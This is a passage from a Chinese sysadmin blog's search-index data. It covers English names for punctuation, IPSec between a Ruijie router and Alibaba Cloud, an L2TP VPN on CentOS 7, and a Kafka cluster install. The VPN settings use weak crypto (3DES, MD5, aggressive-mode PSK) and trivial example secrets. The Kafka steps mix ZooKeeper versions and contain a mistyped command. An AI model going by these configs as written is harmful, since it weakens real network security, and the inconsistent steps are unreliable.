的时候是一个印度老哥做考官，他问我的问题我是一句都听不懂的，确实是听不懂。\n然后他把问题在 webex 中打出来我回答的。\n其中有一个问题是：如何用CLI查出系统中内存占用最高的5个进程\nps aux --sort=-%mem | head -n 5 上面一句如何用英语表达出来呢，不好说啊\n所以记录一下，以备将来不时之需\n． period 句号\r， comma 逗号\r： colon 冒号\r； semicolon 分号\r！ exclamation 惊叹号\r？ question 问号\r- hyphen 连字符\r* asterisk 星号\r\u0026#39; apostrophe 所有格符号，单词内部的省略\r— dash 破折号\r_ underscore\r‘ ’ single quotation marks 单引号\r“ ” double quotation marks 双引号\r( ) round brackets 圆括号\r[ ] square brackets 方括号\r\u0026lt;\u0026gt; Angle brackets 尖括号\r{} curly brackets or braces 大括号\r《 》French quotes 法文引号；书名号\r... ellipsis 省略号\r¨ tandem colon 双点号\r\u0026#34; ditto 同上\r‖ parallel 双线号\r／ slash 斜线号\r＆ ampersand = and\r～ tilde 波浪号\r§ section; division 分节号\r→ arrow 箭号；参见号\r| vertical bar 竖线\rbackslash 反斜线\r% percent 百分号 ","permalink":"https://rendoumi.com/posts/20221117-sign/","summary":"\u003cp\u003e面试 infosys 的时候是一个印度老哥做考官，他问我的问题我是一句都听不懂的，确实是听不懂。\u003c/p\u003e\n\u003cp\u003e然后他把问题在 webex 中打出来我回答的。\u003c/p\u003e\n\u003cp\u003e其中有一个问题是：如何用CLI查出系统中内存占用最高的5个进程\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eps aux --sort=-%mem | head -n 5\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面一句如何用英语表达出来呢，不好说啊\u003c/p\u003e\n\u003cp\u003e所以记录一下，以备将来不时之需\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode class=\"language-javascripts\" data-lang=\"javascripts\"\u003e． period 句号\r\n， comma 逗号\r\n： colon 冒号\r\n； semicolon 分号\r\n！ exclamation 惊叹号\r\n？ question 问号\r\n-  hyphen 连字符\r\n* asterisk 星号\r\n\u0026#39; apostrophe 所有格符号，单词内部的省略\r\n— dash 破折号\r\n_ underscore\r\n‘ ’ single quotation marks 单引号\r\n“ ” double quotation marks 双引号\r\n( ) round brackets 圆括号\r\n[ ] square brackets 方括号\r\n\u0026lt;\u0026gt; Angle brackets 尖括号\r\n{} curly brackets or braces 大括号\r\n《 》French quotes 法文引号；书名号\r\n... ellipsis 省略号\r\n¨ tandem colon 双点号\r\n\u0026#34; ditto 同上\r\n‖ parallel 双线号\r\n／ slash 斜线号\r\n＆ ampersand = and\r\n～ tilde 波浪号\r\n§ section; division 分节号\r\n→ arrow 箭号；参见号\r\n| vertical bar 竖线\r\nbackslash 反斜线\r\n% percent 百分号\n\u003c/code\u003e\u003c/pre\u003e","title":"英语的符号表达"},{"content":"现在也开始搞起桌面运维了，其实还感觉蛮有意思的。\n公司的主路由器是锐捷的NBR6205-E，作为IPSec的服务端，而阿里云作为客户端。\n首先先普及一下IPSec的知识，IPSec目前只支持IPv4单播：\n密钥安全有 IKE 负责；数据安全方面，有 IPSec 负责。\n但是IKE也是 IPSec 的 一 部分，不能独立存在。存在两个SA分别为\nISAKMP Security Association（IKE SA）\nIPsec Security Association（IPsec SA）\n在这里注意一点就是IKE SA=ISAKMP SA\nIKE SA的 lifetime 默认为 86400 秒，即一天，默认没有volume limit。\n用户的数据流量真正是在 IPsec SA 上传递的，而不是在IKE SA；\nIPsec SA直接为用户数据流服务，IPsec SA中的所有安全策略都是为了用户数据流的安全。\nIPsec SA的 lifetime 默认为3600 秒，即1小时；默认volume limit为4608000 Kbytes，即4.608 Gbyte。\n因为SA有两个，分为IKE SA和IPsec SA，两个SA分别定义了如何保护密钥以及如何保护数据，其实这两个SA都是由IKE建立起来的，所以将IKE的整个运行过程分成了两个Phase（阶段），即 ：\nIKE Phase Two IKE Phase One 一、IKE Phase One第一阶段 IKE Phase One的主要工作就是建立IKE SA（ISAKMP SA），IKE SA的服务对象并不是用户数据，而是密钥流量，以及为IPsec SA服务的；IKE SA的协商阶段被称为main mode（主模式）还有 aggressive 野蛮模式，IKE也是需要保护自己的流量安全的（这些流量并非用户流量），所以IKE SA之间也需要协商出一整套安全策略，否则后续的密钥和IPsec SA的建立就不能得到安全保证；\nIKE SA之间需要协商的套安全策略包括：\n认证方式（Authentication）\n共总有Pre-Shared Keys (PSK)，Public Key Infrastructure (PKI)，RSA encrypted nonce，默认为PKI。\n加密算法（Encryption）\n总共有DES，3DES，AES 128，AES 192，AES 256，默认为DES。\nHash算法（HMAC）\n总共有SHA-1，MD5，默认为SHA-1。\n密钥算法（Diffie-Hellman）\nGroups 1 （768 bit），Group 2（1024 bit），Group 5（1536 bit），默认为Groups 1 （768 bit）。\nLifetime\n随用户定义，默认为86,400 seconds，但没有volume limit。\n二、IKE Phase Two第二阶段 IKE Phase Two的目的是要建立IPsec SA，由于IKE SA的服务对象并不是用户数据，而是密钥流量，以及为IPsec SA服务的，IKE SA是为IPsec SA做准备的，所以如果没有IKE SA，就不会有IPsec SA；IPsec SA是基于IKE SA来建立的，建立IPsec SA的过程称为 快速模式（quick mode）。IPsec SA才是真正为用户数据服务的，用户的所有流量都是在IPsec SA中传输的，用户流量靠IPsec SA来保护，IPsec SA同样也需要协商出一整套安全策略，其中包括：\n加密算法（Encryption）\n总共有DES，3DES，AES 128，AES 192，AES 256，默认为DES。\nHash算法（HMAC）\n总共有SHA-1，MD5，默认为SHA-1。\nLifetime\n随用户定义，默认为3600 seconds，即1小时；默认volume limit为4,608,000 Kbytes，即4.608 Gbyte。\n注意：IPsec SA中没有协商认证方式（Authentication）和密钥算法（Diffie-Hellman），因为IKE SA时已经认证过了，所以后面已经不需要再认证；并且密钥是在IKE SA完成的，所以在IPsec SA中也就谈不了密钥算法了，但也可以强制再算。\n上面很啰嗦了一把，但是没办法，因为等会设置的时候都要用到的。\n三、设置锐捷路由器 参数统统提取一下：\n对端IP：就是阿里云客户端那边的IP，47.94.106.58\n预共享密钥：两边都共享的一串字符串\nIPSec隧道生命周期：这里应该是第二阶段的时间，28800秒\nIKE 策略：第一阶段的IKE设置\n机密算法：3DES 散列算法：MD5 DH组：Group2 生命周期：28800秒\n转换集1：esp-3des esp-md5-hmac\n转换集2：esp-3des esp-sha-hmac\n完美向前加密：group2(1024-bit)\nDPD探测类型：periodic\nDPD探测周期：30秒\n协商模式：野蛮模式\n应用到接口：Gi0/7\n需经隧道访问的网段\n本地网段：10.8.0.0/255.255.252.0 总部网段(其实就是对端阿里的vpc网段)：10.10.240.0/255.255.240.0 四、配置阿里云的IPSec 1、首先设置VPN网关 2、建立用户网关 3、建立IPsec连接 4、编辑IPsec连接 上面配置要注意，VPN网关和用户网关选之前加好的，本端网段和对端网段和锐捷路由器上是相反的。预共享密钥是一样。\n另外就是感兴趣流模式，选了这个，就需要在路由表里手动发布路由！！\n再来就是高级配置，第一部分IKE配置\n注意参数，协商模式 aggressive 就是野蛮模式。\n第二部分IPsec配置：\n然后需要到VPN网关，因为选了感兴趣路由，所以IPSec建立好了，这里的策略路由表会出现一条路由\n源：10.10.240/21 目标：10.8.0.0/22，状态是未发布，点一下发布。就好了\n这样两端的 IPSec 就建立好了。\n","permalink":"https://rendoumi.com/posts/20221115-ipsec/","summary":"\u003cp\u003e现在也开始搞起桌面运维了，其实还感觉蛮有意思的。\u003c/p\u003e\n\u003cp\u003e公司的主路由器是锐捷的NBR6205-E，作为IPSec的服务端，而阿里云作为客户端。\u003c/p\u003e\n\u003cp\u003e首先先普及一下IPSec的知识，IPSec目前只支持IPv4单播：\u003c/p\u003e\n\u003cp\u003e密钥安全有 IKE 负责；数据安全方面，有 IPSec 负责。\u003c/p\u003e\n\u003cp\u003e但是IKE也是 IPSec 的 一 部分，不能独立存在。存在两个SA分别为\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eISAKMP Security Association（IKE SA）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIPsec Security Association（IPsec SA）\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e在这里注意一点就是IKE SA=ISAKMP SA\u003c/p\u003e\n\u003cp\u003eIKE SA的 lifetime 默认为 86400 秒，即一天，默认没有volume limit。\u003c/p\u003e\n\u003cp\u003e用户的数据流量真正是在 IPsec SA 上传递的，而不是在IKE SA；\u003c/p\u003e\n\u003cp\u003eIPsec SA直接为用户数据流服务，IPsec SA中的所有安全策略都是为了用户数据流的安全。\u003c/p\u003e\n\u003cp\u003eIPsec SA的 lifetime 默认为3600 秒，即1小时；默认volume limit为4608000 Kbytes，即4.608 Gbyte。\u003c/p\u003e\n\u003cp\u003e因为SA有两个，分为IKE SA和IPsec SA，两个SA分别定义了如何保护密钥以及如何保护数据，其实这两个SA都是由IKE建立起来的，所以将IKE的整个运行过程分成了两个Phase（阶段），即 ：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIKE Phase Two\u003c/li\u003e\n\u003cli\u003eIKE Phase One\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"一ike-phase-one第一阶段\"\u003e一、IKE Phase One第一阶段\u003c/h4\u003e\n\u003cp\u003eIKE Phase One的主要工作就是建立IKE SA（ISAKMP SA），IKE SA的服务对象并不是用户数据，而是密钥流量，以及为IPsec SA服务的；IKE SA的协商阶段被称为main mode（主模式）还有 aggressive 野蛮模式，IKE也是需要保护自己的流量安全的（这些流量并非用户流量），所以IKE SA之间也需要协商出一整套安全策略，否则后续的密钥和IPsec SA的建立就不能得到安全保证；\u003c/p\u003e","title":"阿里云IPSec与锐捷路由器得连接"},{"content":"这是个很奇怪的事情，应聘了一家搞 CDN 的公司，结果上去看了一下根本不对路。就立刻辞了，但是发现它给员工开的 L2TP VPN 确实非常好用。\n于是就自己也搭一个，方便自用。下面记录一下安装过程，环境是CentOS 7\n一、装L2TP # yum install epel-release # yum install xl2tpd libreswan 二、修改核心参数 # vi /etc/sysctl.conf vm.swappiness = 0 net.ipv4.neigh.default.gc_stale_time=120 net.ipv4.conf.all.rp_filter=0 net.ipv4.conf.default.rp_filter=0 net.ipv4.conf.default.arp_announce = 2 net.ipv4.conf.all.arp_announce=2 net.ipv4.tcp_max_tw_buckets = 5000 net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_max_syn_backlog = 1024 net.ipv4.tcp_synack_retries = 2 net.ipv4.conf.lo.arp_announce=2 net.ipv4.ip_forward = 1 net.ipv4.conf.default.accept_redirects = 0 net.ipv4.conf.default.send_redirects = 0 net.ipv4.conf.default.accept_source_route = 0 # sysctl -p 三、配置 IPSEC # vi /etc/ipsec.d/l2tp_psk.conf conn L2TP-PSK-NAT rightsubnet=vhost:%priv also=L2TP-PSK-noNAT conn L2TP-PSK-noNAT authby=secret pfs=no auto=add keyingtries=3 dpddelay=30 dpdtimeout=120 dpdaction=clear rekey=no ikelifetime=8h keylife=1h type=transport left=192.168.10.232 leftprotoport=17/1701 right=%any rightprotoport=17/%any 注意上面的 left=192.168.10.232，这是服务器的ip地址，要更换为自己服务器的地址（如果在防火墙后，写内网地址，非映射后的公网IP）\n然后修改密钥，之后建立L2TP的 iphone 连接时会用到：\n# vim /etc/ipsec.secrets 192.168.10.232 %any: PSK \u0026#34;123456789\u0026#34; 验证一下：\n# ipsec setup start\r# ipsec verify 看到上面两行红字不要慌张，Ignore，忽略掉即可。是内核特性中的reverse path filter特性，没关系。\n然后让 ipsec 自启动\n# systemctl enable ipsec 四、配置xl2tpd # 先备份 # mv /etc/xl2tpd/xl2tpd.conf /etc/xl2tpd/xl2tpd.conf.old # vim /etc/xl2tpd/xl2tpd.conf [global] listen-addr = 192.168.10.232 ipsec saref = yes [lns default] ip range = 192.168.100.128-192.168.100.254 local ip = 192.168.100.99 require chap = yes refuse pap = yes require authentication = yes name = LinuxVPNserver ppp debug = yes pppoptfile = /etc/ppp/options.xl2tpd length bit = yes 注意更换上面 192.168.10.232 的服务器ip地址，同时记住name=LinuxVPNserver\n# 先备份 # mv /etc/ppp/options.xl2tpd /etc/ppp/options.xl2tpd.old # vim /etc/ppp/options.xl2tpd ipcp-accept-local ipcp-accept-remote ms-dns 8.8.8.8 ms-dns 4.2.2.4 noccp #noauth crtscts idle 1800 mtu 1410 mru 1410 nodefaultroute debug lock proxyarp connect-delay 5000 最后编辑用户名和密码\nvim /etc/ppp/chap-secrets # Secrets for authentication using CHAP # client server secret IP addresses test LinuxVPNserver test * 注意格式，第一列是用户名，第二列是上面xl2tpd.conf中记住的name名，第三列是密码，第四列是获取到的ip地址\n然后启动\n# systemctl start xl2tpd # systemctl enable xl2tpd # systemctl status xl2tpd 五、配置防火墙 iptables -A INPUT -p gre -j ACCEPT iptables -A OUTPUT -p gre -j ACCEPT iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT iptables -A FORWARD -s 192.168.100.0/24 -j ACCEPT iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o eth0 -j MASQUERADE 注意上面的eth0，根据服务器的具体情况进行修改\n然后这样就完成了。\n六、配置iphone手机 配置好服务器ip，账户，密码以及密钥就可以了。\n","permalink":"https://rendoumi.com/posts/20221113-l2tp_vpn/","summary":"\u003cp\u003e这是个很奇怪的事情，应聘了一家搞 CDN 的公司，结果上去看了一下根本不对路。就立刻辞了，但是发现它给员工开的 L2TP VPN 确实非常好用。\u003c/p\u003e\n\u003cp\u003e于是就自己也搭一个，方便自用。下面记录一下安装过程，环境是CentOS 7\u003c/p\u003e\n\u003ch4 id=\"一装l2tp\"\u003e一、装L2TP\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# yum install epel-release\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# yum install xl2tpd libreswan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"二修改核心参数\"\u003e二、修改核心参数\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/sysctl.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evm.swappiness \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.neigh.default.gc_stale_time\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e120\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.all.rp_filter\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.default.rp_filter\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.default.arp_announce \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.all.arp_announce\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.tcp_max_tw_buckets \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e5000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.tcp_syncookies \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.tcp_max_syn_backlog \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1024\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.tcp_synack_retries \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.lo.arp_announce\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.ip_forward \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.default.accept_redirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.default.send_redirects \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet.ipv4.conf.default.accept_source_route \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# sysctl -p\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"三配置-ipsec\"\u003e三、配置 IPSEC\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/ipsec.d/l2tp_psk.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econn L2TP-PSK-NAT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003erightsubnet\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003evhost:%priv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003ealso\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eL2TP-PSK-noNAT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econn L2TP-PSK-noNAT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eauthby\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esecret\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003epfs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eauto\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eadd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003ekeyingtries\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003edpddelay\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e30\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003edpdtimeout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e120\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003edpdaction\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eclear\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003erekey\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eikelifetime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e8h\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003ekeylife\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1h\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etransport\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eleft\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e192.168.10.232\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eleftprotoport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e17/1701\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003eright\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%any\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e     \u003cspan class=\"nv\"\u003erightprotoport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e17/%any\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面的 left=192.168.10.232，这是服务器的ip地址，要更换为自己服务器的地址（如果在防火墙后，写内网地址，非映射后的公网IP）\u003c/p\u003e","title":"L2TP VPN在CentOS7系统下的搭建"},{"content":"生产环境要用到kafka，记录一下安装过程，其实最重要的不是安装，而是使用。\n时间节点是2022年7月10日，zookeeper的版本是3.4.14：\nwget https://mirrors.cnnic.cn/apache/zookeeper/stable/zookeeper-3.4.14.tar.gz kafka的版本是3.2，注意前面的2.13是scala的版本\nwget http://archive.apache.org/dist/kafka/3.2.0/kafka_2.13-3.2.0.tgz 软件都下载好以后，找三台服务器，软件都放到 /usr/local 路径下：\n服务器的ip是：\n172.18.31.50 172.18.31.51 172.18.31.52 移动软件：\ntar zxvf zookeeper-3.4.14.tar.gz mv apache-zookeeper-3.6.3-bin /usr/local tar zxvf kafka_2.13-3.2.0.tgz mv kafka_2.13-3.2.0 /usr/local 然后得装 java 了，centos 版本\nyum -y install epel-release yum -y install java-11-openjdk-devel 首先去编辑zookeeper的配置文件，然后启动\ncp /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo_sample.cfg /usr/local/apache-zookeeper-3.6.3-bin/conf/zoo.cfg 编辑zoo.cfg，增加几行\ndataDir=/data/zookeeper metricsProvider.className=org.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider metricsProvider.httpPort=7000 metricsProvider.exportJvmInfo=true server.0=172.18.31.50:20881:30881 server.1=172.18.31.51:20881:30881 server.2=172.18.31.52:20881:30881 注意上面，我们的数据目录是在/data/zookeeper，所以要先建立好目录结构\n然后有三台服务器么，把各自的id放到文件中，然后20881是三台服务器之间的通讯端口，30881是选举端口\nmkdir /data/zookeeper -p echo 0 \u0026gt;/data/zookeeper/myid 三台服务器分别启动\n/usr/local/apache-zookeeper-3.6.3-bin/bin/zkServer.sh start 验证一下\n/usr/local/apache-zookeeper-3.6.3-bin/bin/zkCli.sh [zk: localhost:2181(CONNECTED) 1] ls / [admin, brokers, cluster, config, consumers, controller, controller_epoch, feature, isr_change_notification, latest_producer_id_block, log_dir_event_notification, zookeeper] 看看 / 下有东西就行了，上面是已经装好了 kafka 和 cruisecontrol的情形，东西就比较多了\n然后装 kafka，先修改配置文件\nvi /usr/local/kafka_2.13-3.2.0/config/server.properties #需要修改的地方 broker.id=0 log.dirs=/data/kafka zookeeper.connect=172.18.31.50:2181,172.18.31.51:2181,172.18.31.52:2181 然后启动就可以了\n/usr/local/kafka_2.13-3.2.0/bin/kafka-server-start.sh -daemon /usr/local/kafka_2.13-3.2.0/config/server.properties 验证一下：\n# 新版的 kafka-topics.sh 命令已经变了 cd /usr/local/kafka_2.13-3.2.0/bin # bootstrap-server 写一个就好，我们建立了一个 topic ，叫做 swimmingpool ./kafka-topics.sh --create --bootstrap-server 172.18.31.50:9092 --replication-factor 3 --partitions 3 --topic swimmingpool # 看看细节 ./kafka-topics.sh --describe --bootstrap-server 172.18.31.50:9092 --topic swimmingpool Topic: swimmingpool TopicId: gOLXSh5NQPKMAwEroi_HcQ PartitionCount: 3 ReplicationFactor: 3 Configs: segment.bytes=1073741824 Topic: swimmingpool Partition: 0 Leader: 2 Replicas: 0,2,1 Isr: 2,1,0 Topic: swimmingpool Partition: 1 Leader: 2 Replicas: 2,1,0 Isr: 2,0,1 Topic: swimmingpool Partition: 2 Leader: 2 Replicas: 1,0,2 Isr: 2,0,1 # 生产一些消息，ctrl+c 断出 ./kafka-console-producer.sh --bootstrap-server 172.18.31.50:9092 --topic swimmingpool \u0026gt;i am ok \u0026gt;i am fine \u0026gt;i am good # 消费这些消息，同样用 ctrl+c 断出，注意看，消息是倒序的 ./kafka-consoconsumer.sh --bootstrap-server 172.18.31.50:9092 --topic swimmingpool --from-beginning i am good i am fine i am ok 这样就装好了，但是安装只是第一步，重要的是 topic 的 reblance 以及 partion 的重新分布\n","permalink":"https://rendoumi.com/posts/20221113-kafka/","summary":"\u003cp\u003e生产环境要用到kafka，记录一下安装过程，其实最重要的不是安装，而是使用。\u003c/p\u003e\n\u003cp\u003e时间节点是2022年7月10日，zookeeper的版本是3.4.14：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://mirrors.cnnic.cn/apache/zookeeper/stable/zookeeper-3.4.14.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ekafka的版本是3.2，注意前面的2.13是scala的版本\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://archive.apache.org/dist/kafka/3.2.0/kafka_2.13-3.2.0.tgz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e软件都下载好以后，找三台服务器，软件都放到 /usr/local 路径下：\u003c/p\u003e\n\u003cp\u003e服务器的ip是：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e172.18.31.50\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 